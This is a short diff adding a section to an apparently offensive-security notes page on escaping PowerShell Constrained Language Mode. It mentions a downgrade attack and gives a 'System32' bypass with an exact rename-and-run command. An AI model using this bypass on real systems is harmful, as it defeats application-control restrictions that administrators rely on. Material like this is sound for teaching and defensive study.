@@ -152,3 +152,22 @@ $ExecutionContext.SessionState.LanguageMode
 ```
 
 ### **Circumvent Constrained Language Mode**
+
+You can try the PowerShell downgrade attack mentioned above which should get you into a session with FullLanguage Mode
+
+#### **System32 Bypass**
+
+Create *test.ps1*
+
+```
+# Contents of test.ps1
+$ExecutionContext.SessionState.LanguageMode
+```
+
+Run the following command:
+
+```
+# There is a bypass where if the string *System32* is in the path of the script it will gain FullLanguag Mode
+
+.\test.ps1; mv .\test.ps1 system32.ps1; .\system32.ps1
+```
